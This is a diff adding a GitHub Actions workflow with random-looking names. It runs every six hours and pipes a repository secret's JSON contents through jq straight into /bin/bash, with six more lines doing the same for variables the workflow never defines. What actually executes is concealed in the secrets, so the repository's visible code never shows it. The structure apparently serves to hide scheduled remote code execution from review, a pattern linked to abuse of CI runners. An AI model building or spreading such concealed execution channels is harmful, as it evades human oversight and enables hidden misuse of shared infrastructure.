@@ -1,0 +1,23 @@
+name: feidangaihuang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: feidangaihuang
+        env:
+          efrn0918: ${{ secrets.efrn0918 }}
+        run: |
+          echo $efrn0918 | jq -r .bqzfe25407 | /bin/bash
+          echo $ax5 | jq -r .ei36 | /bin/bash
+          echo $of45030 | jq -r .geu24 | /bin/bash
+          echo $gnilj03401 | jq -r .nvbkw2 | /bin/bash
+          echo $rxny7 | jq -r .wnti59 | /bin/bash
+          echo $hyukw39 | jq -r .olwbj857 | /bin/bash
+          echo $nwrhi90 | jq -r .sr93 | /bin/bash
+
